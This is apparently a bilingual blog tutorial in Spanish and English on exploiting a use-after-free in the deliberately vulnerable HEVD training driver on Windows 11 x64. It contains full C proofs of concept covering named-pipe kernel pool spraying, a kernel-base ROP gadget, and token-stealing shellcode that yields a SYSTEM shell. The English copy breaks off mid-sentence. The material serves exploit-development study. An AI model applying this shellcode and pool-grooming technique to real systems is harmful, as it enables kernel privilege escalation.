CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == INVALID_HANDLE_VALUE) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } evilBuffer = allocate_buffer(); if (evilBuffer == NULL) { printf(\u0026#34;[*] Failed to allocate evil buffer for fake object\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Allocating structure\\n\u0026#34;); sendIoctl(hHEVD, ALLOCATE_REAL_OBJ, NULL, 0); printf(\u0026#34;[*] Freeing structure\\n\u0026#34;); sendIoctl(hHEVD, FREE_OBJ, NULL, 0); printf(\u0026#34;[*] Allocating new object of size 0x%x\\n\u0026#34;, OBJ_SIZE); sendIoctl(hHEVD, ALLOCATE_FAKE_OBJ, evilBuffer, OBJ_SIZE); printf(\u0026#34;[*] Triggering UAF\\n\u0026#34;); sendIoctl(hHEVD, CALL_FUNC_PTR, NULL, 0); } Sin embargo, una vez enviado, no tenemos control sobre el puntero de función. Qué paso?\nDando un Paso Atrás # Decidí establecer puntos de interrupción en las siguientes ubicaciones:\nCreación de la estructura Liberación de dicha estructura Creación del objeto falso Activando el UAF Los puntos de interrupción que utilicé están aquí:\nbu HEVD+0x87a8a # Instruction after calling ExAllocatePoolWithTag(global_struct) bu HEVD+0x87c20 # Instruction after calling ExFreePoolWithTag(global_struct) bu HEVD+0x87912 # Instruction after calling ExAllocatePoolWithTag(global_struct) bu HEVD+0x87cf2 # CALL RCX (function pointer within the global_struct) Mientras establecía estos puntos de interrupción, noté algo muy importante\u0026hellip; Nuestro objeto recién asignado o más bien objeto falso NO ES 0x60 bytes en cambio el original 0x58 bytes.\nEsto significa que necesitaremos encontrar una nueva forma de crear un nuevo objeto del mismo tamaño\u0026hellip;\nKernel Heap Fengshui (Alex Ionescu) # En este punto no sabía que hacer\u0026hellip;\nQué técnicas existen para crear memoria en el NonPaged heap? Se puede hacer esto desde Userland? Empecé a buscar en Google si alguien más había resuelto esto y encontré artículos de VulnDev y hicieron referencia a una publicación de Alex Ionescu escribiendo una técnica para hacer eso, así que decidí leer y tratar de entender el arte de Heap Fengshui.\nPiscinas # Cada vez que escuche la palabra \u0026ldquo;pool\u0026rdquo; en referencia al kernel de Windows, solo necesitas saber que son estructuras utilizadas para controlar el heap del kernel de Windows.\nEl enfoque va ser en dos generadores de regiones de memoria: el generador normal y el grande.\nRegular: Utilizadas para crear memoria que cabe dentro de una página, utilizan espacio para contener un \u0026ldquo;pool header\u0026rdquo; y un sección de memoria libre inicialmente Big: Se utiliza para cualquier cosa más grande que una página y ocupa una o más páginas. También se utilizan cuando se utiliza el tipo CacheAligned de memoria de grupo, independientemente del tamaño de la memoria creada. No hay forma de garantizar fácilmente la alineación de la caché sin dedicar una página completa a una región de memoria creada. Dado que no hay espacio para un \u0026ldquo;header\u0026rdquo; en grandes regiones de memoria creadas, estas páginas se rastrean en una \u0026ldquo;Big Pool Tracking Table\u0026rdquo; separada (nt!PoolBigPageTable). Cada entrada en esta tabla está representada por una estructura POOL_TRACKER_BIG_PAGES\nstruct _POOL_TRACKER_BIG_PAGES { volatile ULONGLONG Va; //0x0 ULONG Key; //0x8 ULONG Pattern:8; //0xc ULONG PoolType:12; //0xc ULONG SlushSize:12; //0xc ULONGLONG NumberOfBytes; //0x10 struct _EPROCESS* ProcessBilled; //0x18 }; Una cosa a tener en cuenta es que la dirección virtual (VA) tiene un operador OR para indicar si está libre o en uso. Alex Ionescu nos propone un script para que WinDbg muestre todas las asignaciones de grupos grandes y algún código de controlador, pero no pude hacerlo funcionar.\nPor ahora, decidí seguir adelante y volver a esto más adelante, una vez que empiece a escribir mis propios controladores de kernel.\nUso de Cloro para Piscinas # Nuestro objetivo es encontrar una API en modo de usuario que nos dé control sobre la información en modo kernel de un objeto del kernel y crear memoria dentro del \u0026ldquo;big pool\u0026rdquo;.\nHay dos ejemplos fáciles (según el autor xD):\nCrear un socket local, escucharlo, conectarse desde otro hilo, aceptar la conexión y luego emitir una escritura de\u0026gt; 4 KB de datos del socket, pero no leerlo. Esto dará resultado en el \u0026ldquo;Ancillary Function Driver (AFD.sys)\u0026rdquo;, creando los datos del socket en la memoria en modo kernel. Como la pila de red de Windows funciona en DISPATCH_LEVEL (IRQL 2), y la paginación no está disponible, la AFD utilizará un buffer de grupo no paginado para la asignación. Crear un \u0026ldquo;named pipe\u0026rdquo; y emitir una escritura de \u0026gt;4 KB de datos, pero no leerlos. Esto dará como resultado que el sistema de archivos de \u0026ldquo;Named Pipe File System (NPFS.SYS)\u0026rdquo; también asigne los datos de canalización en un búfer de grupo no paginado (porque NPFS también realiza la gestión del búfer en DISPATCH_LEVEL). La opción 2 es la más sencilla y requiere menos líneas de código. Lo importante que debemos tener en cuenta es que NPFS antepondrá nuestro búfer con su propio \u0026ldquo;header\u0026rdquo; interno, que se llama DATA_ENTRY. Cada versión de NPFS tiene un tamaño diferente.\n/* The Entries that go into the Queue */ typedef struct _NP_DATA_QUEUE_ENTRY { LIST_ENTRY QueueEntry; ULONG DataEntryType; PIRP Irp; ULONG QuotaInEntry; PSECURITY_CLIENT_CONTEXT ClientSecurityContext; ULONG DataSize; } NP_DATA_QUEUE_ENTRY, *PNP_DATA_QUEUE_ENTRY; La forma de solucionar esto es crear el búfer en modo de usuario con las compensaciones correctas. Finalmente, la clave aquí es tener un búfer que sea al menos del tamaño de una página, para que podamos forzar el asignador de el \u0026ldquo;big pool\u0026rdquo;.\nRegresando a VulnDev # Todavía estaba confundido sobre qué hacer porque la publicación de Alex parecía usar un script de WinDbg que no funcionaba y librerías de controladores en modo Kernel (tal vez soy un n00b?). Quizás las cosas yan cambiado y ese código no funcione con nuestra versión de Windows.\nLo que sigue es ver lo que hizo VulnDev e implementarlo en nuestro exploit. Parecía que VulnDev pudo lograr la asignación de un objeto (cualquier tamaño \u0026gt;0x48) en el NonPagedPool.\nEl PoC se puede ver aquí:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; // IOCTL Codes #define ALLOCATE_REAL_OBJ 0x222013 #define CALL_FUNC_PTR 0x222017 #define FREE_OBJ 0x22201b #define ALLOCATE_FAKE_OBJ 0x22201f typedef struct PipeHandles { HANDLE read; HANDLE write; } PipeHandles; struct PipeHandles CreatePipeObject() { DWORD ALLOC_SIZE = 0x70; BYTE uBuffer[0x28] = { 0 }; // ALLOC_SIZE - HEADER_SIZE (0x48) HANDLE readPipe = NULL; HANDLE writePipe = NULL; DWORD resultLength = 0; RtlFillMemory(uBuffer, 0x28, 0x41); if (!CreatePipe(\u0026amp;readPipe, \u0026amp;writePipe, NULL, sizeof(uBuffer))) { printf(\u0026#34;[-] CreatePipe\\n\u0026#34;); } if (!WriteFile(writePipe, uBuffer, sizeof(uBuffer), \u0026amp;resultLength, NULL)) { printf(\u0026#34;[-] WriteFile\\n\u0026#34;); } return (struct PipeHandles) {.read = readPipe, .write = writePipe}; } void sendIoctl(HANDLE hHEVD, DWORD dIoctl, CHAR *pBuffer, DWORD dBuffer) { DWORD bytesReturned = 0; DeviceIoControl(hHEVD, dIoctl, pBuffer, dBuffer, NULL, 0x00, \u0026amp;bytesReturned, NULL); return; } int main() { HANDLE hHEVD = NULL; PipeHandles pipeHandle = CreatePipeObject(); printf(\u0026#34;[*] Handles: 0x%llx, 0x%llx\u0026#34;, pipeHandle.read, pipeHandle.write); getchar(); DebugBreak(); hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == INVALID_HANDLE_VALUE) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Allocating structure\\n\u0026#34;); sendIoctl(hHEVD, ALLOCATE_REAL_OBJ, NULL, 0); printf(\u0026#34;[*] Freeing structure\\n\u0026#34;); sendIoctl(hHEVD, FREE_OBJ, NULL, 0); return 0; } Una vez más, utilizamos la implementación de VulnDevs. Si ejecutamos esto, los identificadores se imprimen en STDOUT y podemos inspeccionarlos usando WinDbg.\nEn el resultado anterior vemos que el objeto está en un NonPagedPool pero su tamaño es 0x190, qué pasó? Como se menciona en la publicación, al realizar estas operaciones se creó un objeto de DATA_ENTRY. Estos objetos se asignan mediante la etiqueta \u0026ldquo;NpFr\u0026rdquo;. Podemos encontrarlo usando !poolused. Al igual que VulnDev, cuando intenté encontrar esto usando poolfind, no tuve suerte..\nSin embargo, esto muestra que hemos asignado correctamente 112 bytes en el NonPagedPool. Todo tiene sentido ahora… la ecuación es básicamente:\nsizeof(uBuffer) + (sizeof(_NP_DATA_QUEUE_ENTRY) == 0x48) == ALLOC_SIZE Esto se demuestra si ejecutamos el código con las modificaciones adecuadas:\nHay otro problema. Dado que el kernel tiene asignaciones en todo momento, no hay garantía de que nuestra asignación tome la ubicación del objeto liberado.\nUna forma de solucionar esto es crear un montón de hoyos, rodeados de asignaciones que controlamos. Esto nos da una buena oportunidad de obtener nuestra condición de UAF. Una vez que hayamos asignado y liberado el objeto normal, podemos crear un montón de objetos falsos usando AllocateFakeObjectNonPagedPool, esto aumenta nuestras posibilidades de tomar la memoria de asignación liberada.\nBásicamente lo que vamos a hacer es:\nAsigne un montón de objetos DATA_ENTRY (CreatePipe + WriteFile) Libere cada segundo objeto DATA_ENTRY para crear ubicaciones de asignación gratuitas (hoyod) Asigne la estructura USE_AFTER_FREE_NON_PAGED_POOL Libere la estructura USE_AFTER_FREE_NON_PAGED_POOL Intente recuperar la memoria liberada (donde alguna vez estuvo la estructura USE_AFTER_FREE_NON_PAGED_POOL) Activar el UAF y llame a nuestro objeto falso. Para lograr esto utilicé el siguiente código:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; // IOCTL Codes #define ALLOCATE_REAL_OBJ 0x222013 #define CALL_FUNC_PTR 0x222017 #define FREE_OBJ 0x22201b #define ALLOCATE_FAKE_OBJ 0x22201f typedef struct PipeHandles { HANDLE read; HANDLE write; } PipeHandles; struct PipeHandles CreatePipeObject() { BYTE uBuffer[0x18] = { 0 }; // sizeof(uBuffer) + (sizeof(_NP_DATA_QUEUE_ENTRY) == 0x48) == ALLOC_SIZE HANDLE readPipe = NULL; HANDLE writePipe = NULL; DWORD resultLength = 0; RtlFillMemory(uBuffer, 0x18, 0x41); if (!CreatePipe(\u0026amp;readPipe, \u0026amp;writePipe, NULL, sizeof(uBuffer))) { printf(\u0026#34;[-] CreatePipe\\n\u0026#34;); } if (!WriteFile(writePipe, uBuffer, sizeof(uBuffer), \u0026amp;resultLength, NULL)) { printf(\u0026#34;[-] WriteFile\\n\u0026#34;); } return (struct PipeHandles) {.read = readPipe, .write = writePipe}; } void sendIoctl(HANDLE hHEVD, DWORD dIoctl, CHAR *pBuffer, DWORD dBuffer) { DWORD bytesReturned = 0; DeviceIoControl(hHEVD, dIoctl, pBuffer, dBuffer, NULL, 0x00, \u0026amp;bytesReturned, NULL); return; } #define DEF_PIPES 20000 #define SEQ_PIPES 60000 int main() { int i = 0; HANDLE hHEVD = NULL; BYTE uBuffer[0x58] = {0}; PipeHandles defragPipeHandles[DEF_PIPES] = {0}; PipeHandles seqPipeHandles[SEQ_PIPES] = {0}; hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == INVALID_HANDLE_VALUE) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } /* I found this intresting, we must allocate DATA_ENTRY objects like so otherwise we will fail to allocate any. We have to start with a low amount THEN allocate the sequential DATA_ENTRY objects. Although this is just 80000 allocations, we CANNOT just use one loop to hold all 80000 allocations. We must space it out */ printf(\u0026#34;[*] Spraying objects for pool defragmentation\\n\u0026#34;); for (i = 0; i \u0026lt; DEF_PIPES; i++) defragPipeHandles[i] = CreatePipeObject(); for (i = 0; i \u0026lt; SEQ_PIPES; i++) seqPipeHandles[i] = CreatePipeObject(); printf(\u0026#34;[*] Creating holes to store object\\n\u0026#34;); for (i = 0; i \u0026lt; SEQ_PIPES; i++) { if (i % 2 == 0) { CloseHandle(seqPipeHandles[i].read); CloseHandle(seqPipeHandles[i].write); } } printf(\u0026#34;[*] Allocating target structure\\n\u0026#34;); sendIoctl(hHEVD, ALLOCATE_REAL_OBJ, NULL, 0); printf(\u0026#34;[*] Freeing target structure\\n\u0026#34;); sendIoctl(hHEVD, FREE_OBJ, NULL, 0); printf(\u0026#34;[*] Filling holes with custom objects\\n\u0026#34;); *(uint64_t *)(uBuffer) = (uint64_t)(0x41414141); for (int i = 0; i \u0026lt; 30000; i++) sendIoctl(hHEVD, ALLOCATE_FAKE_OBJ, uBuffer, sizeof(uBuffer)); printf(\u0026#34;[*] Triggering UAF\\n\u0026#34;); sendIoctl(hHEVD, CALL_FUNC_PTR, NULL, 0); return 0; } Explotación # Entonces, cómo podemos llegar a nuestro shellcode? Aprendimos que al intentar obtener la ejecución de código en Windows 10, una de las rutas de ataque es marcar la entrada de la tabla de páginas (PTE) como una página del kernel. Sin embargo, dado que la asignación fue realizada por el kernel y marcada como ejecutable, la entrada señalada por RAX debería estar clara para su ejecución!\nDado que tenemos 0x60 bytes de espacio, este debería ser espacio más que suficiente para nuestra carga útil de robo de tokens + código de recuperación. El plan de escape es el siguiente:\nEncuentra un gadget para: Incrementar RAX para que apunte más allá de los primeros 8 bytes en la asignación del grupo no paginado Saltar a RAX Ejecute el Shellcode Reparar la Stack Esta es una imagen de lo que estamos tratando de lograr:\nDespués de una buena batalla, podemos obtener el shell de SYSTEM en Winderp 11.\nAquí está el PoC final:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; // IOCTL Codes #define ALLOCATE_REAL_OBJ 0x222013 #define CALL_FUNC_PTR 0x222017 #define FREE_OBJ 0x22201b #define ALLOCATE_FAKE_OBJ 0x22201f // DATA_ENTRY Allocations #define DEF_PIPES 20000 #define SEQ_PIPES 60000 /* CreatePipeObject(): This function creates a pipe and returns the handles to the read and write ends of said pipe. However, what this does in the case of our exploit is create an allocation in the NonPaged pool. It\u0026#39;s important to note each allocation is made by the Named Pipe File System (NPFS.sys). That said it will prepend an allocation with a DATA_ENTRY structure (or NP_DATA_QUEUE_ENTRY), on an x86_64 system this structure is 0x48 bytes. So each allocation must be greater than 0x48 bytes. Equation below: CreatePipe(HANDLE hR, HANDLE hW, NULL, nSize); NonPagedAllocation = nSize + sizeof(_NP_DATA_QUEUE_ENTRY) So in our case we\u0026#39;re allocating 0x60 bytes in the NonPaged pool. This code was taken from VulnDevs blog located here: https://vulndev.io/2022/07/14/windows-kernel-exploitation-hevd-x64-use-after-free/ The only difference is this was written in C vs C++ */ typedef struct PipeHandles { HANDLE read; HANDLE write; } PipeHandles; struct PipeHandles CreatePipeObject() { BYTE uBuffer[0x18] = { 0 }; HANDLE readPipe = NULL; HANDLE writePipe = NULL; DWORD resultLength = 0; RtlFillMemory(uBuffer, 0x18, 0x41); if (!CreatePipe(\u0026amp;readPipe, \u0026amp;writePipe, NULL, sizeof(uBuffer))) { printf(\u0026#34;[-] CreatePipe\\n\u0026#34;); } if (!WriteFile(writePipe, uBuffer, sizeof(uBuffer), \u0026amp;resultLength, NULL)) { printf(\u0026#34;[-] WriteFile\\n\u0026#34;); } return (struct PipeHandles) {.read = readPipe, .write = writePipe}; } /* SendIOCTL(): Send the IOCTL code to the driver */ void SendIOCTL(HANDLE hHEVD, DWORD dIoctl, CHAR *pBuffer, DWORD dBuffer) { DWORD bytesReturned = 0; DeviceIoControl(hHEVD, dIoctl, pBuffer, dBuffer, NULL, 0x00, \u0026amp;bytesReturned, NULL); return; } /* GetKernelBaseAddress(): Using EnumDeviceDrivers() obtain the base address of ntoskrnl.exe */ uint64_t GetKernelBaseAddress() { ULONG_PTR pKernelBaseAddress = 0; LPVOID *lpImageBase = NULL; DWORD dwBytesNeeded = 0; if (!EnumDeviceDrivers(NULL, 0, \u0026amp;dwBytesNeeded)) { printf(\u0026#34;[-] Failed to calculate bytes needed for device driver entries\u0026#34;); return -1; } if (!(lpImageBase = (LPVOID *)HeapAlloc(GetProcessHeap(), 0, dwBytesNeeded))) { printf(\u0026#34;[-] Failed to allocate heap for lpImageBase\\n\u0026#34;); if (lpImageBase) { HeapFree(GetProcessHeap(), 0, lpImageBase); } return -1; } if (!EnumDeviceDrivers(lpImageBase, dwBytesNeeded, \u0026amp;dwBytesNeeded)) { printf(\u0026#34;[-] EnumDeviceDrivers: %d\u0026#34;, GetLastError()); if (lpImageBase) { HeapFree(GetProcessHeap(), 0, lpImageBase); } return -1; } pKernelBaseAddress = ((ULONG_PTR *)lpImageBase)[0]; HeapFree(GetProcessHeap(), 0, lpImageBase); printf(\u0026#34;[*] Kernel Base Address: %llx\\n\u0026#34;, pKernelBaseAddress); return pKernelBaseAddress; } /* CheckWin(): Simple function to check if we\u0026#39;re running as SYSTEM */ int CheckWin(VOID) { DWORD win = 0; DWORD dwLen = 0; CHAR *cUsername = NULL; GetUserNameA(NULL, \u0026amp;dwLen); if (dwLen \u0026gt; 0) { cUsername = (CHAR *)malloc(dwLen * sizeof(CHAR)); } else { printf(\u0026#34;[-] Failed to allocate buffer for username check\\n\u0026#34;); return -1; } GetUserNameA(cUsername, \u0026amp;dwLen); win = strcmp(cUsername, \u0026#34;SYSTEM\u0026#34;); free(cUsername); return (win == 0) ? win : -1; } /* Exploit(): NonPaged Pool UAF */ int Exploit(HANDLE hHEVD) { PipeHandles defragPipeHandles[DEF_PIPES] = {0}; PipeHandles seqPipeHandles[SEQ_PIPES] = {0}; int i = 0; int64_t kernelBaseAddr = GetKernelBaseAddress(); char cShellcode[0x58] = \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; // FUNCTION POINTER \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; // NOP SLED // sickle -p windows/x64/kernel_token_stealer -f c -m pinpoint \u0026#34;\\x65\\x48\\xa1\\x88\\x01\\x00\\x00\\x00\\x00\\x00\\x00\u0026#34; // movabs rax, qword ptr gs:[0x188] \u0026#34;\\x48\\x8b\\x80\\xb8\\x00\\x00\\x00\u0026#34; // mov rax, qword ptr [rax + 0xb8] \u0026#34;\\x48\\x89\\xc1\u0026#34; // mov rcx, rax \u0026#34;\\xb2\\x04\u0026#34; // mov dl, 4 \u0026#34;\\x48\\x8b\\x80\\x48\\x04\\x00\\x00\u0026#34; // mov rax, qword ptr [rax + 0x448] \u0026#34;\\x48\\x2d\\x48\\x04\\x00\\x00\u0026#34; // sub rax, 0x448 \u0026#34;\\x38\\x90\\x40\\x04\\x00\\x00\u0026#34; // cmp byte ptr [rax + 0x440], dl \u0026#34;\\x75\\xeb\u0026#34; // jne 0x1017 \u0026#34;\\x48\\x8b\\x90\\xb8\\x04\\x00\\x00\u0026#34; // mov rdx, qword ptr [rax + 0x4b8] \u0026#34;\\x48\\x89\\x91\\xb8\\x04\\x00\\x00\u0026#34; // mov qword ptr [rcx + 0x4b8], rdx // KERNEL RECOVERY \u0026#34;\\x48\\x31\\xc0\u0026#34; // xor rax, rax \u0026#34;\\x48\\x83\\xc4\\x48\u0026#34; // add rsp, 0x48 \u0026#34;\\xc3\u0026#34;; // ret /* I found this intresting, we must allocate DATA_ENTRY objects like so otherwise we will fail to allocate any. We have to start with a low amount THEN allocate the sequential DATA_ENTRY objects. Although this is just 80000 allocations, we CANNOT just use one loop to hold all 80000 allocations. We must space it out */ printf(\u0026#34;[*] Spraying objects for pool defragmentation\\n\u0026#34;); for (i = 0; i \u0026lt; DEF_PIPES; i++) defragPipeHandles[i] = CreatePipeObject(); for (i = 0; i \u0026lt; SEQ_PIPES; i++) seqPipeHandles[i] = CreatePipeObject(); printf(\u0026#34;[*] Creating holes to store object\\n\u0026#34;); for (i = 0; i \u0026lt; SEQ_PIPES; i++) { if (i % 2 == 0) { CloseHandle(seqPipeHandles[i].read); CloseHandle(seqPipeHandles[i].write); } } printf(\u0026#34;[*] Allocating target structure\\n\u0026#34;); SendIOCTL(hHEVD, ALLOCATE_REAL_OBJ, NULL, 0); printf(\u0026#34;[*] Freeing target structure\\n\u0026#34;); SendIOCTL(hHEVD, FREE_OBJ, NULL, 0); printf(\u0026#34;[*] Filling holes with custom objects\\n\u0026#34;); *(uint64_t *)(cShellcode) = (uint64_t)(kernelBaseAddr + 0x40176b); /* add al, 0x10 ; call rax [nt] */ for (int i = 0; i \u0026lt; 30000; i++) SendIOCTL(hHEVD, ALLOCATE_FAKE_OBJ, cShellcode, 0x58); printf(\u0026#34;[*] Triggering UAF\\n\u0026#34;); SendIOCTL(hHEVD, CALL_FUNC_PTR, NULL, 0); return CheckWin(); } int main() { HANDLE hHEVD = NULL; hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == INVALID_HANDLE_VALUE) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } if (Exploit(hHEVD) == 0) { printf(\u0026#34;[*] Exploitation successful, enjoy your shell\\n\\n\u0026#34;); system(\u0026#34;cmd.exe\u0026#34;); } else { printf(\u0026#34;[-] Exploitation failed, run again\\n\u0026#34;); return -1; } return 0; } Una vez compilado (x86_64-w64-mingw32-gcc poc.c -o poc.exe), conseguimos nuestro acceso :)\nRecursos # https://media.blackhat.com/bh-dc-11/Mandt/BlackHat_DC_2011_Mandt_kernelpool-wp.pdf https://vulndev.io/2022/07/14/windows-kernel-exploitation-hevd-x64-use-after-free/ https://web.archive.org/web/20230602115237/https://www.alex-ionescu.com/kernel-heap-spraying-like-its-2015-swimming-in-the-big-kids-pool/ https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf https://connormcgarr.github.io/swimming-in-the-kernel-pool-part-1/ https://www.vergiliusproject.com/ ","date":"21 December 2024","externalUrl":null,"permalink":"/posts/0x03-acerc%C3%A1ndose-al-heap-moderno-del-windows-kernel/","section":"Posts","summary":"","title":"0x03 - Acercándose al Heap Moderno del Windows Kernel","type":"posts"},{"content":" ₍₍ (ง ˙ω˙)ว ⁾⁾ Hablas Español? Empújame! Having exploited the UaF in Windows 7 (x86) we have obtained a solid idea of how this vulnerability works, it\u0026rsquo;s time to attempt exploitation on Windows 11 (x64).\nIt\u0026rsquo;s important to note, although we confirmed that Violet Phosphorus works against Windows 11 24H2, for the remainder of the series I will be using Windows 11 (x64) - 10.0.22000 N/A Build 22000, simply due this being the Windows version the rest of the exploits were tested on.\nYou\u0026rsquo;re more than welcome to adapt any of these tutorials to the latest version of Windows however as previously stated you will need to adapt to additional security controls introduced in the latest OS.\nTable of Contents # Reverse Engineering Taking a Step Back Kernel Heap Fengshui (Alex Ionescu) Pools Using Chlorine for Pool Control Back to VulnDev Exploitation Sources Reverse Engineering # We already know a lot about this vulnerability since we previously exploited it in Windows 7 (x86), however there’s a few key things we need to obtain before being able to continue. Since we previously used the source code, we’ll now change our focus on using Ghidra. At a high-level to craft our exploit we’re going to need the following information:\nThe size of the object (to leverage the UaF) IOCTL Codes This information can be obtained easily since we know where to look. The object size on x64 has changed from 0x58 bytes to 0x60 bytes as shown below.\nNext we can get the IOCTL codes from IrpDeviceIoCtlHandler(), the ones that matter to us are the following:\nFunction IOCTL Code AllocateUaFObjectNonPagedPoolIoctlHandler 0x222013 UseUaFObjectNonPagedPoolIoctlHandler 0x222017 FreeUaFObjectNonPagedPoolIoctlHandler 0x22201b AllocateFakeObjectNonPagedPoolIoctlHandler 0x22201f With that we have everything we need to craft a PoC.\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; // IOCTL Codes #define ALLOCATE_REAL_OBJ 0x222013 #define CALL_FUNC_PTR 0x222017 #define FREE_OBJ 0x22201b #define ALLOCATE_FAKE_OBJ 0x22201f // Allocated object size #define OBJ_SIZE 0x60 void sendIoctl(HANDLE hHEVD, DWORD dIoctl, CHAR *pBuffer, DWORD dBuffer) { DWORD bytesReturned = 0; DeviceIoControl(hHEVD, dIoctl, pBuffer, dBuffer, NULL, 0x00, \u0026amp;bytesReturned, NULL); return; } char *allocate_buffer() { char *buffer = malloc(OBJ_SIZE); if (buffer != NULL) { memset(buffer, 0x41, OBJ_SIZE); } return buffer; } int main() { HANDLE hHEVD = NULL; char *evilBuffer = NULL; hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == INVALID_HANDLE_VALUE) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } evilBuffer = allocate_buffer(); if (evilBuffer == NULL) { printf(\u0026#34;[*] Failed to allocate evil buffer for fake object\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Allocating structure\\n\u0026#34;); sendIoctl(hHEVD, ALLOCATE_REAL_OBJ, NULL, 0); printf(\u0026#34;[*] Freeing structure\\n\u0026#34;); sendIoctl(hHEVD, FREE_OBJ, NULL, 0); printf(\u0026#34;[*] Allocating new object of size 0x%x\\n\u0026#34;, OBJ_SIZE); sendIoctl(hHEVD, ALLOCATE_FAKE_OBJ, evilBuffer, OBJ_SIZE); printf(\u0026#34;[*] Triggering UAF\\n\u0026#34;); sendIoctl(hHEVD, CALL_FUNC_PTR, NULL, 0); } However, once sent, we don\u0026rsquo;t get control over the function pointer. What went wrong?\nTaking a Step Back # I decided to set breakpoints on the following locations:\nAllocation of the structure Freeing of said structure Allocation of the fake object Triggering of the UAF Below are the breakpoints I used:\nbu HEVD+0x87a8a # Instruction after calling ExAllocatePoolWithTag(global_struct) bu HEVD+0x87c20 # Instruction after calling ExFreePoolWithTag(global_struct) bu HEVD+0x87912 # Instruction after calling ExAllocatePoolWithTag(global_struct) bu HEVD+0x87cf2 # CALL RCX (function pointer within the global_struct) While setting these breakpoints, I noticed something very important\u0026hellip; Our newly allocated object or rather fake object IS NOT 0x60 bytes instead it\u0026rsquo;s the original 0x58 bytes.\nThis means we\u0026rsquo;ll need to find a new way to allocate a new object of equal size\u0026hellip;\nKernel Heap Fengshui (Alex Ionescu) # At this point I was completely stuck on what to do next\u0026hellip;\nWhat techniques exist to achieve a NonPaged allocation? Can this be done from Userland? I started to google if anyone else had solved this and came across VulnDevs writeups and they referenced a blog post by Alex Ionescu describing a technique to do just that, so I decided to read up and try to understand the art of Heap Fengshui.\nPools # Anytime you hear the word \u0026ldquo;pool\u0026rdquo; in reference to the Windows Kernel, understand that these are simply structures used for Windows Kernel Heap management.\nWe\u0026rsquo;re going to be focusing on two allocators the regular and big/large pool allocator.\nRegular: Used for any allocations that fit within a page, these allocations utilize space to hold a pool header and initial free block. Big: Used for anything larger than a page and take up one or more pages. They’re also used when the CacheAligned type of pool memory is used, regardless of the allocation size. There\u0026rsquo;s no way to easily guarantee cache alignment without dedicating a whole page to an allocation. Because there\u0026rsquo;s no room for a header in big allocations, these pages are tracked in a separate \u0026ldquo;Big Pool Tracking Table\u0026rdquo; (nt!PoolBigPageTable). Each entry in this table is represented by a POOL_TRACKER_BIG_PAGES structure.\nstruct _POOL_TRACKER_BIG_PAGES { volatile ULONGLONG Va; //0x0 ULONG Key; //0x8 ULONG Pattern:8; //0xc ULONG PoolType:12; //0xc ULONG SlushSize:12; //0xc ULONGLONG NumberOfBytes; //0x10 struct _EPROCESS* ProcessBilled; //0x18 }; One thing to be aware of is that the Virtual Address (VA) is OR\u0026rsquo;ed to indicate if free or in use. At most there will be one allocation. Alex Ionescu provides a WinDbg script to dump all big pool allocations and some driver code however I couldn’t get it to work.\nFor now, I decided to move on and return to this at a later date once I start writing my own kernel drivers.\nUsing Chlorine for Pool Control # Ultimately our goal is to find a user-mode API that will give us full control over the kernel-mode data of a kernel object and create a big pool allocation.\nBelow are two easy examples (according to the author xD):\nCreating a local socket, listening to it, connecting from another thread, accepting the connection, and then issuing a write of \u0026gt; 4KB of socket data, but not reading it. This will result in the Ancillary Function Driver (AFD.sys), allocating the socket data in kernel-mode memory. Because the Windows network stack functions at DISPATCH_LEVEL (IRQL 2), and paging is not available, AFD will use a nonpaged pool buffer for the allocation. Creating a named pipe, and issuing a write of \u0026gt;4KB of data, but not reading it. This will result in the Named Pipe File System (NPFS.SYS) allocating the pipe data in a nonpaged pool buffer as well (because NPFS performs buffer management at 